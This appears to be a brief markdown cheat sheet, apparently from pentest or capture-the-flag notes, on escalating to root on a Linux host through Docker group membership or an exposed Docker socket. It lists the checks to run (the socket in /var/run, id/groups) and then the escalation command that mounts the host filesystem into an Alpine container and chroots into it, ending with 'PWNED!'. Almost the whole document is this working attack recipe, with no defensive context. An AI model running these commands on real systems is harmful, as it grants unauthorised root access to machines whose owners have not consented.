# REQUIREMENTS:

### 1) User must be in docker group to run docker commands

### 2) Docker socket must be exposed

## STEPS:

#### 1) cd /var/run

#### 2) ls -la | grep sock

#### 3) id/groups

#### If user has permissions to run docker commands then we:

#### 4) Mount host volumes (Download an alpine image to host)

#### 5) docker run -v /:/mnt --rm -it alpine chroot /mnt sh

#### 6) PWNED!
